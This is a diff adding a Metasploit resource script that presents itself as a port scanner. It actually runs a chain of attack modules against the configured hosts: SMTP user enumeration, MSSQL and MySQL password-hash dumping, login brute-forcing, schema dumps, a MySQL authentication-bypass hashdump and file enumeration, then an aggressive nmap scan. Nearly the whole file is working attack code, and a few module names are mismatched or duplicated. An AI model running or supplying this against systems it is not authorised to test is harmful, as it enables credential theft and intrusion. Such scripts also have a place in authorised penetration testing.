@@ -1,0 +1,88 @@
+# portscan.rc
+# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)
+
+# This Metasploit RC-File could be used to portscan the network via nmap or via the internal portscanner module 
+# it also uses the udp_sweep module
+# RHOSTS is used from the global datastore
+# VERBOSE is used from the global datastore
+# you can define your own Nmap options via the global NMAPOPTS variable
+
+<ruby>
+#set ports for Metasploit tcp-portscanner (change this for your needs):
+ports = "7,21,22,23,25,43,50,53,67,68,79,80,109,110,111,123,135,137,138,139,143,161,264,265,389,443,445,500,631,901,995,1241,1352,1433,1434,1521,1720,1723,3306,3389,3780,4662,5800,5801,5802,5803,5900,5901,5902,5903,6000,6666,8000,8080,8443,10000,10043,27374,27665"
+
+if (framework.datastore['RHOSTS'] == nil)
+	print_status("you have to set RHOSTS globally ... exiting")
+	return
+end
+begin
+
+# SMTP ENUMERATION
+
+print_line("Module: SMTP_ENUM")
+run_single("use scanner/smtp/smtp_enum")
+run_single("set THREADS 10")
+run_single("exploit")
+
+# MSSQL ENUMERATION
+print_line("Module: MSSQL_PING")
+run_single("use scanner/mssql/mssql_ping")
+run_single("exploit")
+
+
+print_line("Module: MSSQL_HASHDUMP")
+run_single("use scanner/mssql/mssql_hashdump")
+run_single("exploit")
+
+print_line("Module: MSSQL_Login")
+print_line("Attempting to login to the MSSQL Databases of RHOSTS") 
+run_single("use scanner/mssql/mssql_login")
+run_single("exploit")
+
+print_line("Module: MSSQL_SCHEMA_DUMP")
+run_single("use scanner/mssql/mssql_schemadump")
+run_single("exploit")
+
+print_line("Module: MYSQL_AUTHBYPASS_HASHDUMP")
+run_single("use scanner/mysql/mysql_authbypass_hashdump")
+run_single("exploit")
+
+print_line("Module: MYSQL_VERSION")
+run_single("use scanner/mssql/mssql_version")
+run_single("exploit")
+
+#MYSQL ENUMERATION
+
+print_line("Module: MYSQL_AUTHBYPASS_HASHDUMP")
+run_single("use auxiliary/scanner/mysql/mysql_authbypass_hashdump") 
+run_single("exploit")
+
+print_line("Module: MYSQL_FILE_ENUM") 
+run_single("use auxiliary/scanner/mysql/mysql_file_enum")          
+ 
+run_single("exploit")
+
+print_line("MYSQL_HASHDUMP") 
+run_single("use auxiliary/scanner/mysql/mysql_hashdump")           
+ 
+run_single("exploit")
+
+print_line("Module: MYSQL_LOGIN") 
+run_single("use auxiliary/scanner/mysql/mysql_login")         
+ 
+run_single("exploit")
+ print_line("Module: MYSQL_SCHEMADUMP") 
+run_single("use auxiliary/scanner/mysql/mysql_schemadump")   
+ 
+run_single("exploit")
+ 
+print_line("MYSQL_VERSION")
+run_single("use auxiliary/scanner/mysql/mysql_version")
+ 
+run_single("exploit")
+print_line("Running full nmap scan on RHOSTS, this could take a while...") 
+run_single("db_nmap --min-hostgroup 96 -sS -n -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 -PN -P0 -O -sSV #{framework.datastore['RHOSTS']}")
+
+print_line("Scan Complete - either copy and paste results into VIM or view in terminal...Happy Hacking!")
+end
+</ruby>
